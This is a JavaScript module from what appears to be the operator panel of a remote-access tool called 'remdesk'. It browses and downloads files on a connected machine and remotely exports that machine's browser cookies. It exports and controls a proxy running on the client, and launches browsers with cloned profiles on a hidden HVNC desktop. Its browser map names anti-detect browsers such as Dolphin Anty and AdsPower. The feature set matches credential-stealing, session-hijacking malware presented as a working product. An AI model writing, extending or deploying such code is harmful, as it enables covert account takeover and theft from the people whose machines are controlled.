(() => {
  "use strict";

  const remdesk = window.remdesk;
  const { state, dom, constants } = remdesk;
  const { STORAGE_TIMEOUT_MS } = constants;

  function toggleStorage(forceOpen) {
    if (!dom.storageDrawer) {
      return;
    }
    const isOpen = dom.storageDrawer.classList.contains("open");
    const shouldOpen = typeof forceOpen === "boolean" ? forceOpen : !isOpen;
    dom.storageDrawer.classList.toggle("open", shouldOpen);
    dom.storageDrawer.setAttribute("aria-hidden", (!shouldOpen).toString());
    if (shouldOpen) {
      dom.storageDrawer.focus();
      if (state.isConnected) {
        void requestRemoteList(state.remoteCurrentPath);
      } else {
        remdesk.setRemoteStatus("Not connected", "warn");
      }
    }
  }

  function joinRemotePath(base, name) {
    if (!base || base === ".") {
      return name;
    }
    const trimmed = base.replace(/[\\/]+$/, "");
    return `${trimmed}/${name}`;
  }

  function getParentPath(path) {
    if (!path) {
      return ".";
    }
    if (path === ".") {
      return ".";
    }
    const parts = path.split(/[\\/]/).filter(Boolean);
    if (parts.length <= 1) {
      return ".";
    }
    return parts.slice(0, -1).join("/") || ".";
  }

  function formatBytes(value) {
    if (value === null || value === undefined) {
      return "-";
    }
    const bytes = Number(value);
    if (!Number.isFinite(bytes)) {
      return "-";
    }
    if (bytes === 0) {
      return "0 B";
    }
    const unit = 1024;
    const units = ["B", "KB", "MB", "GB", "TB"];
    const index = Math.min(Math.floor(Math.log(bytes) / Math.log(unit)), units.length - 1);
    const size = bytes / unit ** index;
    return `${size.toFixed(size >= 10 || index === 0 ? 0 : 1)} ${units[index]}`;
  }

  function getOpenChannel() {
    const channel = state.controlChannel;
    if (!channel || channel.readyState !== "open") {
      return null;
    }
    return channel;
  }

  async function sendChannelPayload(payload, onNotReady, onError) {
    const channel = getOpenChannel();
    if (!channel) {
      if (onNotReady) {
        onNotReady();
      }
      return false;
    }
    try {
      const message = await remdesk.encodeOutgoing(payload);
      if (channel.readyState !== "open") {
        if (onNotReady) {
          onNotReady();
        }
        return false;
      }
      channel.send(message);
      return true;
    } catch (error) {
      if (onError) {
        onError(error);
      }
      return false;
    }
  }

  async function requestRemoteList(path) {
    state.remoteCurrentPath = path || ".";
    if (dom.remotePathInput) {
      dom.remotePathInput.value = state.remoteCurrentPath;
    }
    remdesk.setRemoteStatus("Loading...", "warn");
    remdesk.clearStorageTimeout();
    state.storageTimer = setTimeout(() => {
      remdesk.setRemoteStatus("Storage request timed out", "bad");
      state.storageTimer = null;
    }, STORAGE_TIMEOUT_MS);
    await sendChannelPayload(
      { action: "list_files", path: state.remoteCurrentPath },
      () => {
        remdesk.setRemoteStatus("Data channel not ready", "warn");
        remdesk.clearStorageTimeout();
      },
      (error) => {
        remdesk.setRemoteStatus(`E2EE error: ${error.message}`, "bad");
        remdesk.clearStorageTimeout();
      }
    );
  }

  async function requestDownload(path) {
    state.pendingDownload = {
      path,
      name: getBaseName(path),
      kind: "file"
    };
    remdesk.setDownloadStatus(`Downloading ${state.pendingDownload.name}`, "warn");
    await sendChannelPayload(
      { action: "download", path },
      () => {
        remdesk.setDownloadStatus("Data channel not ready", "warn");
        state.pendingDownload = null;
      },
      (error) => {
        remdesk.setDownloadStatus(`E2EE error: ${error.message}`, "bad");
        state.pendingDownload = null;
      }
    );
  }

  function normalizeCookieList(browsers) {
    if (!browsers) {
      return [];
    }
    const list = Array.isArray(browsers) ? browsers : [browsers];
    const cleaned = list
      .map((item) => String(item || "").trim().toLowerCase())
      .filter(Boolean);
    return Array.from(new Set(cleaned));
  }

  function buildCookieFilename(browsers) {
    const label = browsers.length ? browsers.join("_") : "all";
    const stamp = new Date().toISOString().replace(/[:.]/g, "").slice(0, 15);
    return `cookies_${label}_${stamp}.json`;
  }

  function buildProxyFilename(clientId) {
    const raw = String(
      clientId || (dom.sessionIdInput ? dom.sessionIdInput.value : "") || "client"
    ).trim();
    const safe = raw.replace(/[^a-z0-9_-]+/gi, "_") || "client";
    return `proxy_${safe}.txt`;
  }

  async function requestCookieExport(browsers, filenameOverride, retry = false) {
    const normalized = normalizeCookieList(browsers);
    const label = normalized.length ? normalized.join(", ") : "all";
    const filename = filenameOverride || buildCookieFilename(normalized);
    if (!retry) {
      state.pendingExport = {
        kind: "cookies",
        browsers: normalized,
        filename
      };
      state.pendingExportRetries = 0;
    }
    state.pendingDownload = {
      name: filename,
      kind: "cookies"
    };
    remdesk.setCookieStatus(`Exporting cookies (${label})`, "warn");
    remdesk.setDownloadStatus(`Exporting cookies (${label})`, "warn");
    const payload = { action: "export_cookies" };
    if (normalized.length) {
      payload.browsers = normalized;
    }
    await sendChannelPayload(
      payload,
      () => {
        remdesk.setCookieStatus("Data channel not ready", "warn");
        state.pendingDownload = null;
      },
      (error) => {
        remdesk.setCookieStatus(`E2EE error: ${error.message}`, "bad");
        state.pendingDownload = null;
      }
    );
  }

  async function requestProxyExport(clientId, filenameOverride, retry = false) {
    const filename = filenameOverride || buildProxyFilename(clientId);
    if (!retry) {
      state.pendingExport = {
        kind: "proxy",
        clientId,
        filename
      };
      state.pendingExportRetries = 0;
    }
    state.pendingDownload = {
      name: filename,
      kind: "proxy"
    };
    remdesk.setDownloadStatus(`Exporting proxy (${filename})`, "warn");
    await sendChannelPayload(
      { action: "export_proxy" },
      () => {
        remdesk.setDownloadStatus("Data channel not ready", "warn");
        state.pendingDownload = null;
      },
      (error) => {
        remdesk.setDownloadStatus(`E2EE error: ${error.message}`, "bad");
        state.pendingDownload = null;
      }
    );
  }

  async function requestProxyControl(action, options, retry = false) {
    const actionName = action === "proxy_stop" ? "Stopping" : "Starting";
    if (!retry) {
      state.pendingProxyControl = {
        action,
        options: options && typeof options === "object" ? options : null
      };
      state.pendingExportRetries = 0;
    }
    remdesk.setDownloadStatus(`${actionName} proxy...`, "warn");
    const payload = { action };
    if (options && typeof options === "object") {
      Object.assign(payload, options);
    }
    await sendChannelPayload(
      payload,
      () => {
        remdesk.setDownloadStatus("Data channel not ready", "warn");
        state.pendingProxyControl = null;
      },
      (error) => {
        remdesk.setDownloadStatus(`E2EE error: ${error.message}`, "bad");
        state.pendingProxyControl = null;
      }
    );
  }

  async function requestProxyStart(options, retry = false) {
    await requestProxyControl("proxy_start", options, retry);
  }

  async function requestProxyStop(options, retry = false) {
    await requestProxyControl("proxy_stop", options, retry);
  }

  async function requestAppLaunch(appName) {
    if (!state.controlEnabled) {
      remdesk.setAppStatus("Switch to manage mode to launch apps", "warn");
      return;
    }
    
    // In HVNC mode, launch app on HVNC desktop instead of main desktop
    // Check BOTH sessionMode AND actual hvnc.state.active (HVNC can be active without mode change)
    const isHvncModeSet = state.sessionMode === "hvnc";
    const isHvncActive = remdesk.hvnc && remdesk.hvnc.state && remdesk.hvnc.state.active;
    const shouldUseHvnc = isHvncModeSet || isHvncActive;
    
    if (shouldUseHvnc && remdesk.hvnc) {
      // Check if HVNC is active
      if (!isHvncActive) {
        remdesk.setAppStatus("Start HVNC first", "warn");
        return;
      }
      
      // Map app name to browser name for HVNC
      const browserMap = {
        "chrome": "chrome",
        "firefox": "firefox",
        "edge": "edge",
        "opera": "opera",
        "brave": "brave",
        "safari": "chrome", // fallback
        "samsung_internet": "chrome",
        "uc_browser": "chrome",
        "huawei_browser": "chrome",
        "dolphin_anty": "chrome",
        "octo": "chrome",
        "adspower": "chrome",
        "linken_sphere_2": "chrome"
      };
      
      const hvncBrowser = browserMap[appName] || appName;
      remdesk.setAppStatus(`Launching ${appName} on HVNC...`, "warn");
      
      // Send HVNC launch browser action
      remdesk.hvnc.sendAction("launch_browser", { 
        browser: hvncBrowser, 
        clone_profile: true 
      });
      return;
    }
    
    // Normal mode - launch on main desktop
    state.pendingAppLaunch = appName;
    remdesk.setAppStatus(`Launching ${appName}...`, "warn");
    await sendChannelPayload(
      { action: "launch_app", app: appName },
      () => {
        remdesk.setAppStatus("Data channel not ready", "warn");
        state.pendingAppLaunch = null;
      },
      (error) => {
        remdesk.setAppStatus(`E2EE error: ${error.message}`, "bad");
        state.pendingAppLaunch = null;
      }
    );
  }

  function drainCookieQueue() {
    if (!state.isConnected) {
      return;
    }
    const queue = window.__remdeskCookieQueue;
    if (!Array.isArray(queue) || queue.length === 0) {
      return;
    }
    window.__remdeskCookieQueue = [];
    queue.forEach((entry) => {
      if (Array.isArray(entry)) {
        void requestCookieExport(entry);
        return;
      }
      if (entry && typeof entry === "object") {
        void requestCookieExport(entry.browsers || [], entry.filename || null);
      }
    });
  }

  function drainProxyQueue() {
    if (!state.isConnected) {
      return;
    }
    const queue = window.__remdeskProxyQueue;
    if (!Array.isArray(queue) || queue.length === 0) {
      return;
    }
    window.__remdeskProxyQueue = [];
    queue.forEach((entry) => {
      if (entry && typeof entry === "object") {
        void requestProxyExport(entry.clientId || null, entry.filename || null);
      }
    });
  }

  function drainProxyControlQueue() {
    if (!state.isConnected) {
      return;
    }
    const queue = window.__remdeskProxyControlQueue;
    if (!Array.isArray(queue) || queue.length === 0) {
      return;
    }
    window.__remdeskProxyControlQueue = [];
    queue.forEach((entry) => {
      if (entry && typeof entry === "object") {
        if (entry.action === "proxy_stop") {
          void requestProxyStop(entry.options || null);
        } else {
          void requestProxyStart(entry.options || null);
        }
      }
    });
  }

  window.remdeskDownloadCookies = (browsers, filename) => {
    if (!remdesk.ensureChannelOpen()) {
      const list = Array.isArray(browsers)
        ? browsers
        : browsers
          ? [browsers]
          : [];
      window.__remdeskCookieQueue = window.__remdeskCookieQueue || [];
      window.__remdeskCookieQueue.push({ browsers: list, filename: filename || null });
      return;
    }
    void requestCookieExport(browsers, filename);
  };

  window.remdeskDownloadProxy = (clientId, filename) => {
    if (!remdesk.ensureChannelOpen()) {
      window.__remdeskProxyQueue = window.__remdeskProxyQueue || [];
      window.__remdeskProxyQueue.push({ clientId: clientId || null, filename: filename || null });
      return;
    }
    void requestProxyExport(clientId, filename);
  };

  window.remdeskProxyStart = (options) => {
    if (!remdesk.ensureChannelOpen()) {
      window.__remdeskProxyControlQueue = window.__remdeskProxyControlQueue || [];
      window.__remdeskProxyControlQueue.push({ action: "proxy_start", options: options || null });
      return;
    }
    void requestProxyStart(options || null);
  };

  window.remdeskProxyStop = (options) => {
    if (!remdesk.ensureChannelOpen()) {
      window.__remdeskProxyControlQueue = window.__remdeskProxyControlQueue || [];
      window.__remdeskProxyControlQueue.push({ action: "proxy_stop", options: options || null });
      return;
    }
    void requestProxyStop(options || null);
  };

  function retryPendingExport() {
    if (!state.pendingExport || !remdesk.ensureChannelOpen()) {
      return;
    }
    if (state.pendingExportRetries >= 1) {
      return;
    }
    state.pendingExportRetries += 1;
    if (state.pendingExport.kind === "cookies") {
      void requestCookieExport(
        state.pendingExport.browsers || [],
        state.pendingExport.filename || null,
        true
      );
      return;
    }
    if (state.pendingExport.kind === "proxy") {
      void requestProxyExport(state.pendingExport.clientId || null, state.pendingExport.filename || null, true);
    }
  }

  function handleProxyControlResponse(payload) {
    const action = payload && payload.action ? payload.action : "proxy";
    const success = payload && payload.success !== false;
    const label = action === "proxy_stop" ? "Proxy stopped" : "Proxy started";
    if (success) {
      remdesk.setDownloadStatus(label, "ok");
    } else {
      remdesk.setDownloadStatus(`${label} failed`, "bad");
    }
    state.pendingProxyControl = null;
  }

  function handleFileList(entries) {
    remdesk.clearStorageTimeout();
    dom.remoteFileList.textContent = "";
    if (!entries.length) {
      const row = document.createElement("tr");
      const cell = document.createElement("td");
      cell.colSpan = 3;
      cell.className = "empty-state";
      cell.textContent = "Empty folder";
      row.appendChild(cell);
      dom.remoteFileList.appendChild(row);
      remdesk.setRemoteStatus("Folder is empty", "warn");
      return;
    }

    const sorted = entries.slice().sort((a, b) => {
      if (a.is_dir !== b.is_dir) {
        return a.is_dir ? -1 : 1;
      }
      return a.name.localeCompare(b.name);
    });

    sorted.forEach((entry) => {
      const row = document.createElement("tr");
      const nameCell = document.createElement("td");
      const sizeCell = document.createElement("td");
      const actionCell = document.createElement("td");
      const entryPath = entry.path || joinRemotePath(state.remoteCurrentPath, entry.name);

      if (entry.is_dir) {
        const nameButton = document.createElement("button");
        nameButton.type = "button";
        nameButton.className = "entry-link";
        nameButton.textContent = entry.name;
        nameButton.addEventListener("click", () => {
          void requestRemoteList(entryPath);
        });
        nameCell.appendChild(nameButton);

        const openButton = document.createElement("button");
        openButton.type = "button";
        openButton.className = "ghost small";
        openButton.textContent = "Open";
        openButton.addEventListener("click", () => {
          void requestRemoteList(entryPath);
        });
        actionCell.appendChild(openButton);
        sizeCell.textContent = "-";
      } else {
        const nameSpan = document.createElement("span");
        nameSpan.className = "entry-file";
        nameSpan.textContent = entry.name;
        nameCell.appendChild(nameSpan);

        const downloadButton = document.createElement("button");
        downloadButton.type = "button";
        downloadButton.className = "secondary small";
        downloadButton.textContent = "Download";
        downloadButton.addEventListener("click", () => {
          void requestDownload(entryPath);
        });
        actionCell.appendChild(downloadButton);
        sizeCell.textContent = formatBytes(entry.size);
      }

      row.appendChild(nameCell);
      row.appendChild(sizeCell);
      row.appendChild(actionCell);
      dom.remoteFileList.appendChild(row);
    });

    remdesk.setRemoteStatus(`Loaded ${entries.length} item(s)`, "ok");
  }

  function getBaseName(path) {
    const parts = path.split(/[\\/]/);
    return parts[parts.length - 1] || "download";
  }

  function addDownloadEntry(name) {
    const stamp = new Date().toISOString().slice(11, 16);
    const item = document.createElement("li");
    item.textContent = `${name} at ${stamp}`;

    const emptyItem = dom.downloadList.querySelector(".empty-state");
    if (emptyItem) {
      dom.downloadList.textContent = "";
    }
    dom.downloadList.prepend(item);
  }

  function saveBase64File(base64, filename) {
    if (
      window.remdeskHost &&
      typeof window.remdeskHost.saveBase64 === "function"
    ) {
      try {
        window.remdeskHost.saveBase64(filename || "download", base64);
        return;
      } catch (error) {
        console.warn("Qt bridge save failed, falling back to browser download.", error);
      }
    }
    const cleaned = base64.replace(/\s+/g, "");
    const binary = atob(cleaned);
    const bytes = new Uint8Array(binary.length);
    for (let i = 0; i < binary.length; i += 1) {
      bytes[i] = binary.charCodeAt(i);
    }
    const blob = new Blob([bytes]);
    const url = URL.createObjectURL(blob);
    const link = document.createElement("a");
    link.href = url;
    link.download = filename || "download";
    document.body.appendChild(link);
    link.click();
    link.remove();
    URL.revokeObjectURL(url);
  }

  function handleError(errorPayload) {
    remdesk.clearStorageTimeout();
    const message = errorPayload.message || "Unknown error";
    if (
      errorPayload.code === "invalid_control" &&
      typeof message === "string" &&
      message.toLowerCase().includes("text")
    ) {
      state.textInputSupported = false;
    }
    if (state.pendingAppLaunch) {
      remdesk.setAppStatus(message, "bad");
      state.pendingAppLaunch = null;
      return;
    }
    if (state.pendingProxyControl) {
      remdesk.setDownloadStatus(message, "bad");
      state.pendingProxyControl = null;
      return;
    }
    if (state.pendingDownload) {
      if (state.pendingDownload.kind === "cookies") {
        remdesk.setCookieStatus(message, "bad");
      }
      remdesk.setDownloadStatus(message, "bad");
      if (
        state.pendingExport &&
        (state.pendingDownload.kind === "cookies" || state.pendingDownload.kind === "proxy")
      ) {
        state.pendingExport = null;
        state.pendingExportRetries = 0;
      }
      state.pendingDownload = null;
      return;
    }
    remdesk.setRemoteStatus(message, "bad");
  }

  function handleAppLaunchStatus(payload) {
    const appName = payload.app || "app";
    if (payload.status === "launched") {
      remdesk.setAppStatus(`Launched ${appName}`, "ok");
    } else {
      remdesk.setAppStatus(`Launch failed: ${appName}`, "bad");
    }
    state.pendingAppLaunch = null;
  }

  function updateDrawerOffset() {
    const edgeGap = getComputedStyle(document.documentElement)
      .getPropertyValue("--edge-gap")
      .trim();
    const minTop = Number.parseFloat(edgeGap) || 16;
    dom.storageDrawer.style.top = `${minTop}px`;
  }

  remdesk.toggleStorage = toggleStorage;
  remdesk.joinRemotePath = joinRemotePath;
  remdesk.getParentPath = getParentPath;
  remdesk.formatBytes = formatBytes;
  remdesk.requestRemoteList = requestRemoteList;
  remdesk.requestDownload = requestDownload;
  remdesk.normalizeCookieList = normalizeCookieList;
  remdesk.buildCookieFilename = buildCookieFilename;
  remdesk.buildProxyFilename = buildProxyFilename;
  remdesk.requestCookieExport = requestCookieExport;
  remdesk.requestProxyExport = requestProxyExport;
  remdesk.requestProxyStart = requestProxyStart;
  remdesk.requestProxyStop = requestProxyStop;
  remdesk.requestAppLaunch = requestAppLaunch;
  remdesk.drainCookieQueue = drainCookieQueue;
  remdesk.drainProxyQueue = drainProxyQueue;
  remdesk.drainProxyControlQueue = drainProxyControlQueue;
  remdesk.retryPendingExport = retryPendingExport;
  remdesk.handleProxyControlResponse = handleProxyControlResponse;
  remdesk.handleFileList = handleFileList;
  remdesk.getBaseName = getBaseName;
  remdesk.addDownloadEntry = addDownloadEntry;
  remdesk.saveBase64File = saveBase64File;
  remdesk.handleError = handleError;
  remdesk.handleAppLaunchStatus = handleAppLaunchStatus;
  remdesk.updateDrawerOffset = updateDrawerOffset;
})();
